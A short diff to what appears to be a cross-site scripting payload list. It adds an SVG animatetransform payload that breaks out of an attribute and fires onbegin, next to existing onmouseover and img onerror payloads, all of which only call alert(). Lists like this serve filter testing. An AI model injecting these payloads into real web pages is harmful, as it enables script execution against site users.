@@ -4,6 +4,9 @@
 <a onmouseover="alert('Hi!')">HOVER ME</a>
 ------------------------------------------
 
+"><svg><animatetransform onbegin=alert(1)>
+------------------------------------------
+
 </span><img src=1 onerror=alert(1) /><span>
 ------------------------------------------
 
